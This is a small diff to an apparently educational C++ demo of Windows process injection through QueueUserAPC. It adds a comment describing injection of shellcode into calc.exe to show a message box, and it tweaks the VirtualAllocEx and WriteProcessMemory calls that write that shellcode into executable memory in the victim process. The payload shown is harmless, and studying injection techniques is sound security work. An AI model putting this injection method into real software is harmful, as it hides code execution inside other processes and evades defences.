@@ -1,3 +1,10 @@
+/* Method of injecting payload using QueueUserAPC() function */
+/* Purpose:
+            Inject 'payload/asmCallMsg.asm' to calc.exe process
+            Make sure the calculator is running              
+            --> This will pop a message box on successful injection
+    Note: executer defined is the byte code of asmCallMsg.asm */
+
 #include <windows.h>
 #include <TlHelp32.h>
 #include <vector>
@@ -6,7 +13,6 @@
 #include <stdlib.h>
 
 #pragma comment (lib, "Ws2_32.lib")                     // Need to link with Ws2_32.lib
-
 using namespace std;
 
 byte executer[] = {
@@ -56,7 +62,7 @@ void main()
 			cout<<"[!] failed to get handle for process: "<<pid<<endl;
 			return;
 		}
-		auto p = ::VirtualAllocEx(hProcess, nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+		auto p = ::VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 		if(p==NULL) {
 			cout<<"[!] memory allocation failed!"<<endl;
 			return ;
@@ -64,7 +70,7 @@ void main()
 		unsigned long injectedFn = (unsigned long)p;
 		cout<<"[i] allocated memory address: 0x"<<hex<<injectedFn<<dec<<endl;
 
-		if(::WriteProcessMemory(hProcess, p, exe, size, nullptr)==0){
+		if(::WriteProcessMemory(hProcess, p, exe, size, NULL)==0){
 			DWORD err = GetLastError();
 			cout<<"[!] write to victim process memory failed with error: "<<dec<<err<<endl;
 			return ;
